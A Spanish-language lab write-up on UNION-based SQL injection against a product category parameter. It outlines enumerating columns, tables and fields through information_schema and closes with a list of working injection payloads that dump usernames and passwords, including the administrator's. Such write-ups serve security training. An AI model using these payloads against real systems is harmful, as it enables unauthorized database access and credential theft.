La vulnerabilidad está en el parámetro de categoría de productos. Gracias a que la respuesta incluye los datos de la consulta, podemos aprovecharla para visualizar información del sistema.

El objetivo final es extraer las credenciales de todos los usuarios (incluido el administrador) a partir de las siguientes etapas:

- Descubrir cuántas columnas devuelve la consulta original y qué tipo de datos aceptan, usando un payload simple para comprobarlo.
- Listar todas las tablas existentes en la base de datos consultando ‘**information_schema.tables**‘, una tabla especial que contiene metadatos.
- Identificar la tabla que almacena los usuarios y contraseñas, observando su nombre en la respuesta.
- Listar las columnas de esa tabla, consultando ‘**information_schema.columns**‘ y filtrando por el nombre de tabla que acabamos de encontrar.
- Extraer los valores de las columnas relevantes, mostrando directamente los nombres de usuario y contraseñas de todos los usuarios.

Una vez obtenida la contraseña del administrador, podemos usarla para iniciar sesión en la aplicación y completar el laboratorio.

**Quédate con esto**: Con técnicas de enumeración y ataques UNION bien estructurados, es posible reconstruir la estructura interna de una base de datos y acceder a información crítica como credenciales de usuarios.

----

* Primero debemos de buscar el total de columnas existentes que nos muestra la Web
    + ' order by 10-- -
    + ' order by 5-- -
    + ' order by 2-- -
    + ' union select 1,2-- -
    + ' union select  'hola','markos'-- -
    + ' union select  @@version-- -
    + ' union select  1,schema_name from information_schema.schemata-- - (bases de datos)
    + ' union select  1,table_name from information_schema.tables where table_schema='DB'-- - (tablas de la base de datos)
    + ' union select  1,column_name from information_schema.columns where table_schema='DB' and table_name='TABLE'-- -
    + ' union select 1,group_concat(username,0x3a,password) from academy_labs.products-- -
    + ' union select 1,concat(username,0x3a,password) from academy_labs.products-- - (si no funciona group_concat)
    + ' union select 1,group_concat(username||0x3a||password) from academy_labs.products-- - (forma alternativa de poner las comas)
    + 